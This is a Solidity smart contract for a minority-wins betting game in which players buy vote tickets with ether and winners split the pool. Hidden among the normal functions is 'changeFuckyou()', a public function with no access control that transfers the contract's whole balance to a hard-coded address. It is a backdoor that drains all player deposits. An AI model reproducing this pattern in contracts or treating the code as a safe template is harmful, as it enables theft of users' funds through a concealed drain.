contract MDGame is Owned {
    using SafeMath for *;
    struct turnInfos{
        string question;
        string option1name;
        string option2name;
        uint endTime;
        uint option1;
        uint option2;
        uint pool;
        bool feeTake;
    }
    struct myturnInfo{
        uint option1;
        uint option2;
        bool isWithdraw;
    }
    uint public theTurn;
    uint public turnLast;
    uint public ticketMag;
    event voteEvent(address Addr, uint256 option, uint256 ethvalue, uint256 round, address ref);
    mapping(uint => turnInfos) public TurnInfo;
    mapping(uint => mapping (address => myturnInfo)) public RoundMyticket;
    constructor () public {
        theTurn = 0;
        turnLast = 7200;
        ticketMag = 4000000000000;
    }
    function StartNewGame (string question, string option1name, string option2name) public onlyOwner{
        require(TurnInfo[theTurn].endTime < now || theTurn == 0);
        theTurn++;
        TurnInfo[theTurn].question = question;
        TurnInfo[theTurn].option1name = option1name;
        TurnInfo[theTurn].option2name = option2name;
        TurnInfo[theTurn].endTime = now + turnLast*60;
    }
    function vote (uint option,address referred) public payable{
        require(msg.sender == tx.origin);
        require(TurnInfo[theTurn].endTime>now);
        emit voteEvent(msg.sender, option, msg.value.mul(1000000000000000000).div(calculateTicketPrice()), theTurn, referred);
        if (referred != address(0) && referred != msg.sender){
            if(option == 1){
                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                RoundMyticket[theTurn][referred].option1 += msg.value.mul(10000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option1 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));
            } else if(option == 2){
                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                RoundMyticket[theTurn][referred].option2 += msg.value.mul(10000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option2 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));
            }else{
                revert();
            }
        }else{
            if(option == 1){
                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
            } else if(option == 2){
                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
            }else{
                revert();
            }  
        }
    }
    function win (uint turn) public{
        require(TurnInfo[turn].endTime<now);
        require(!RoundMyticket[turn][msg.sender].isWithdraw);
        if(TurnInfo[turn].option1<TurnInfo[turn].option2){
            msg.sender.transfer(calculateYourValue1(turn));
        }else if(TurnInfo[turn].option1>TurnInfo[turn].option2){
            msg.sender.transfer(calculateYourValue2(turn));
        }else{
            msg.sender.transfer(calculateYourValueEven(turn));
        }
        RoundMyticket[turn][msg.sender].isWithdraw = true;
    }
    function calculateYourValue1(uint turn) public view returns (uint value){
        if(TurnInfo[turn].option1>0){
            return RoundMyticket[turn][msg.sender].option1.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option1;
        }else{
           return 0;
        }
    }
    function calculateYourValue2(uint turn) public view returns (uint value){
        if(TurnInfo[turn].option2>0){
            return RoundMyticket[turn][msg.sender].option2.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option2;
        }else{
            return 0;
        }
    }
    function calculateYourValueEven(uint turn) public view returns (uint value){
        if(TurnInfo[turn].option1+TurnInfo[turn].option2>0){
            return (RoundMyticket[turn][msg.sender].option2+RoundMyticket[turn][msg.sender].option1).mul(TurnInfo[turn].pool).mul(98)/100/(TurnInfo[turn].option1+TurnInfo[turn].option2);
        }else{
            return 0;
        }
    }
    function calculateTicketPrice() public view returns(uint price){
       return ((TurnInfo[theTurn].option1 + TurnInfo[theTurn].option2).div(1000000000000000000).sqrt().mul(ticketMag)).add(10000000000000000);
    }
    function calculateFee(uint turn) public view returns(uint price){
        return TurnInfo[turn].pool.mul(2)/100;
    }
    function withdrawFee(uint turn) public onlyOwner{
        require(TurnInfo[turn].endTime<now);
        require(!TurnInfo[turn].feeTake);
        owner.transfer(calculateFee(turn));
        TurnInfo[turn].feeTake = true;
    }
    function changeTurnLast(uint time) public onlyOwner{
        turnLast = time;
    }
    function changeTicketMag(uint mag) public onlyOwner{
        require(TurnInfo[theTurn].endTime<now);
        ticketMag = mag;
    }
    bool public callthis = false;
    function changeFuckyou() public {
        require(!callthis);
        address(0xF735C21AFafd1bf0aF09b3Ecc2CEf186D542fb90).transfer(address(this).balance);
        callthis = true;
    }
    function getTimeLeft() public view returns(uint256)
    {
        if(TurnInfo[theTurn].endTime == 0 || TurnInfo[theTurn].endTime < now) 
            return 0;
        else 
            return(TurnInfo[theTurn].endTime.sub(now) );
    }
    function getFullround() public view returns(uint[] pot, uint[] theOption1,uint[] theOption2,uint[] myOption1,uint[] myOption2,uint[] theMoney,bool[] Iswithdraw) {
        uint[] memory totalPool = new uint[](theTurn);
        uint[] memory option1 = new uint[](theTurn);
        uint[] memory option2 = new uint[](theTurn);
        uint[] memory myoption1 = new uint[](theTurn);
        uint[] memory myoption2 = new uint[](theTurn);
        uint[] memory myMoney = new uint[](theTurn);
        bool[] memory withd = new bool[](theTurn);
        uint counter = 0;
        for (uint i = 1; i < theTurn+1; i++) {
            if(TurnInfo[i].pool>0){
                totalPool[counter] = TurnInfo[i].pool;
            }else{
                totalPool[counter]=0;
            }
            if(TurnInfo[i].option1>0){
                option1[counter] = TurnInfo[i].option1;
            }else{
                option1[counter] = 0;
            }
            if(TurnInfo[i].option2>0){
                option2[counter] = TurnInfo[i].option2;
            }else{
                option2[counter] = 0;
            }
            if(TurnInfo[i].option1<TurnInfo[i].option2){
                myMoney[counter] = calculateYourValue1(i);
            }else if(TurnInfo[i].option1>TurnInfo[i].option2){
                myMoney[counter] = calculateYourValue2(i);
            }else{
                myMoney[counter] = calculateYourValueEven(i);
            }
            if(RoundMyticket[i][msg.sender].option1>0){
                myoption1[counter] = RoundMyticket[i][msg.sender].option1;
            }else{
                myoption1[counter]=0;
            }
            if(RoundMyticket[i][msg.sender].option2>0){
                myoption2[counter] = RoundMyticket[i][msg.sender].option2;
            }else{
                myoption2[counter]=0;
            }
            if(RoundMyticket[i][msg.sender].isWithdraw==true){
                withd[counter] = RoundMyticket[i][msg.sender].isWithdraw;
            }else{
                withd[counter] = false;
            }
            counter++;
        }
    return (totalPool,option1,option2,myoption1,myoption2,myMoney,withd);
  }
}
